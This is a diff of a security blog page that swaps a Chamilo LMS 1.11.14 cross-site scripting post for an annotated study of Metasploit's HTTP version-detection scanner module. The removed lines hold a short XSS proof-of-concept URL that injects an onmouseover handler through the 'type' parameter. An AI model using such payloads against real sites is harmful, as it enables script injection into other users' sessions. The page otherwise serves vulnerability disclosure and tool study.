@@ -23,7 +23,7 @@
   <meta name="description" content="">
   <meta name="author" content="FunPhishing">
   <meta name="keywords" content="">
-  <title>Chamilo LMS 1.11.14 Cross Site Scripting - Fun Phishing</title>
+  <title>Metasploit Module Program Note - http_version - Fun Phishing</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -153,9 +153,9 @@
               <div class="full-bg-img">
                 <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
                   <div class="page-header text-center fade-in-up">
-                    <span class="h2 text1" id="subtitle" title="Chamilo LMS 1.11.14 Cross Site Scripting">
+                    <span class="h2 text1" id="subtitle" title="Metasploit Module Program Note - http_version">
                       
-                        Chamilo LMS 1.11.14 Cross Site Scripting
+                        Metasploit Module Program Note - http_version
                       
                     </span>
         
@@ -165,8 +165,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-01-30 19:34" pubdate>
-        January 30, 2021 pm
+      <time datetime="2021-01-31 21:02" pubdate>
+        January 31, 2021 pm
       </time>
     </span>
   
@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      52 字
+      437 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      8
        分钟
     </span>
   
@@ -218,12 +218,10 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Chamilo LMS 1.11.14 Cross Site Scripting</h1>
+            <h1 style="display: none">Metasploit Module Program Note - http_version</h1>
             
             <div class="markdown-body">
-              <h4 id="Chamilo-LMS-1-11-14-Cross-Site-Scripting"><a href="#Chamilo-LMS-1-11-14-Cross-Site-Scripting" class="headerlink" title="Chamilo LMS 1.11.14 Cross Site Scripting"></a>Chamilo LMS 1.11.14 Cross Site Scripting</h4><p>Chamilo LMS version 1.11.14 suffers from a cross site scripting vulnerability.</p>
-<p>POC:</p>
-<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">URL: http://alihost/chamilo/main/calendar/agenda_list.php?type=x<br>&quot;%20onmouseover=netsparker(0x01CE61)%20x=&quot;#collapse-personal_1<br>Parameter Name: type<br>Parameter Type: GET<br>Attack Pattern: x%22+onmouseover%3dnetsparker(0x01CE61)+x%3d%22<br></code></pre></div></td></tr></table></figure>
+              <h4 id="Metasploit-Module-Program-Note-http-version"><a href="#Metasploit-Module-Program-Note-http-version" class="headerlink" title="Metasploit Module Program Note - http_version"></a>Metasploit Module Program Note - http_version</h4><figure class="highlight ruby"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;rex/proto/http&#x27;</span> <span class="hljs-comment">#require /opt/metasploit-framework/embedded/framework/lib/ all methods of the http protocol.</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MetasploitModule</span> &lt; Msf::Auxiliary <span class="hljs-comment">#class defined this module is the auxiliary module </span></span><br><br>  <span class="hljs-comment"># Exploit mixins should be called first</span><br>  <span class="hljs-keyword">include</span> Msf::Exploit::Remote::HttpClient <span class="hljs-comment"># include the /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/remote/http_client.rb all methods of HttpClient(mean http_client)</span><br>  <span class="hljs-keyword">include</span> Msf::Auxiliary::WmapScanServer <span class="hljs-comment">#include /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/wmap_scan_server.rb all methods of WmapScanServer(mean wmap_scan_server)</span><br>  <span class="hljs-comment"># Scanner mixin should be near last</span><br>  <span class="hljs-keyword">include</span> Msf::Auxiliary::Scanner <span class="hljs-comment">#include /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb</span><br><br>  def initialize <span class="hljs-comment">#ruby default constructor function </span><br>    <span class="hljs-keyword">super</span>( <span class="hljs-comment">#like MetasploitModule &lt; Msf::Auxiliary use thesuper(x)，the x will define variable in the module.</span><br>      <span class="hljs-string">&#x27;Name&#x27;</span>        =&gt; <span class="hljs-string">&#x27;HTTP Version Detection&#x27;</span>, <span class="hljs-comment">#Module name</span><br>      <span class="hljs-string">&#x27;Description&#x27;</span> =&gt; <span class="hljs-string">&#x27;Display version information about each system.&#x27;</span>, <span class="hljs-comment">#Module Description</span><br>      <span class="hljs-string">&#x27;Author&#x27;</span>      =&gt; <span class="hljs-string">&#x27;hdm&#x27;</span>, <span class="hljs-comment">#Module author</span><br>      <span class="hljs-string">&#x27;License&#x27;</span>     =&gt; MSF_LICENSE <span class="hljs-comment">#Module license</span><br>    )<br><br>    register_wmap_options(&#123; <span class="hljs-comment">#setting wmap_option /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/wmap_module.rb</span><br>        <span class="hljs-string">&#x27;OrderID&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-comment"># self.orderid = options[&#x27;OrderID&#x27;]</span><br>        <span class="hljs-string">&#x27;Require&#x27;</span> =&gt; &#123;&#125;, <span class="hljs-comment"># self.requiredids = options[&#x27;Require&#x27;]</span><br>      &#125;)<br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-comment"># Fingerprint a single host</span><br>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run_host</span><span class="hljs-params">(ip)</span></span> <span class="hljs-comment">#use /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb methods run_host ，not customizable function name.</span><br>    <span class="hljs-keyword">begin</span> <span class="hljs-comment">#function start</span><br>      connect <span class="hljs-comment">#use methods connect，will build a http connection ，use /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb methods connect</span><br>      res = send_request_raw(&#123; <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span> &#125;) <span class="hljs-comment">#use /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/remote/http_client.rb methods send_request_raw</span><br>      fp = http_fingerprint(<span class="hljs-symbol">:response</span> =&gt; res) <span class="hljs-comment">#use /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/remote/http_client.rb methods http_fingerprint</span><br>      print_good(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;ip&#125;</span>:<span class="hljs-subst">#&#123;rport&#125;</span> <span class="hljs-subst">#&#123;fp&#125;</span>&quot;</span>) <span class="hljs-keyword">if</span> fp <span class="hljs-comment">#use ruby if modifier，will print if fp(http_fingerprint) had retrun，use methods rex(print_good)</span><br>      report_service(<span class="hljs-symbol">:host</span> =&gt; rhost, <span class="hljs-symbol">:port</span> =&gt; rport, <span class="hljs-symbol">:sname</span> =&gt; (ssl ? <span class="hljs-string">&#x27;https&#x27;</span> : <span class="hljs-string">&#x27;http&#x27;</span>), <span class="hljs-symbol">:info</span> =&gt; fp) <span class="hljs-comment">#use /opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/report.rb methods report_service to save report。</span><br>    <span class="hljs-keyword">rescue</span> <span class="hljs-symbol">:</span><span class="hljs-symbol">:Timeout</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Error</span>, <span class="hljs-symbol">:</span><span class="hljs-symbol">:Errno</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:EPIPE</span> <span class="hljs-comment">#Use the timeout module to handle exceptions and other errors in the case of module timeout.</span><br>    <span class="hljs-keyword">ensure</span> <span class="hljs-comment"># Regardless of whether there is an exception, execute next.</span><br>      disconnect <span class="hljs-comment">#use method disconnect ，disconnect http connection，use/opt/metasploit-framework/embedded/framework/lib/msf/core/auxiliary/scanner.rb methods disconnect</span><br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure>
             </div>
             <hr>
             <div>
@@ -232,7 +230,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/Exploit/">Exploit</a>
+                      <a class="hover-with-bg" href="/categories/Note/">Note</a>
                     
                   </div>
                 
@@ -240,7 +238,7 @@
                   <div class="post-meta">
                     <i class="iconfont icon-tags"></i>
                     
-                      <a class="hover-with-bg" href="/tags/Cross-Site-Scripting/">Cross Site Scripting</a>
+                      <a class="hover-with-bg" href="/tags/Metasploit-Module/">Metasploit Module</a>
                     
                   </div>
                 
@@ -253,18 +251,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/31/Metasploit-Module-Program-Note-http-version/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Metasploit Module Program Note - http_version</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/01/30/Backdoor-Win32-Zetronic-Denial-Of-Service/">
-                        <span class="hidden-mobile">Backdoor.Win32.Zetronic Denial Of Service</span>
+                      <a href="/2021/01/30/Chamilo-LMS-1-11-14-Cross-Site-Scripting/">
+                        <span class="hidden-mobile">Chamilo LMS 1.11.14 Cross Site Scripting</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -290,7 +282,7 @@
           repo: 'chat',
           owner: 'FunPhishing',
           admin: ["FunPhishing"],
-          id: '4cd99f0b2210e767266b3a3bd0c387df',
+          id: '83a4ad74297cac90f0cbcfa861f19872',
           language: 'zh-CN',
           labels: ["Gitalk"],
           perPage: 10,
